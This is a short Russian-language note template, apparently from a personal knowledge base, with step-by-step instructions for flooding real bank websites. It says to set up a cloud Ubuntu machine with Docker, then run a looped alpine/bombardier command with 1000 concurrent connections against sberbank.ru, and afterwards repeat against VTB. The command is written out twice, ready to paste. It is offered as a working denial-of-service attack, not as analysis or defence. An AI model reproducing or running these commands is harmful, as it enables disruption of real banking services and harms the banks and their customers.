---
alias: [ ]
---
tag: #Stub #Tool  
 [Source](),  
Related: [[]],  
Docs:  

## Описание
1. берем машину в клауде , не в германских регионах. или просто рабочие машины, все что угодно.
2. ставим убунту на нее 
3. ставим докер шаг за шагом по инструкции - https://docs.docker.com/engine/install/ubuntu (https://docs.docker.com/engine/install/ubuntu/)/ 
4. sudo apt install screen && screen 
5. запускаем след скрипт : 


for i in {1..1000}; do sudo docker run -it alpine/bombardier -c 1000 -d 60s -l https://www.sberbank.ru/ && sleep 5; done

6. ctrl+a , ctrl+d 
7. забываем про машину часа на 2.
8. меняем сайт сбера на сайт другого банка (втб) и заново

Docker Documentation (https://docs.docker.com/engine/install/ubuntu/)
Install Docker Engine on Ubuntu
Instructions for installing Docker Engine on Ubuntu

## Шаблон 
```bash

```
## Примеры: 
######  
```bash
for i in {1..1000}; do sudo docker run -it alpine/bombardier -c 1000 -d 60s -l https://www.sberbank.ru/ && sleep 5; done

```

## Используемые или важные ключи.
### Файлы  



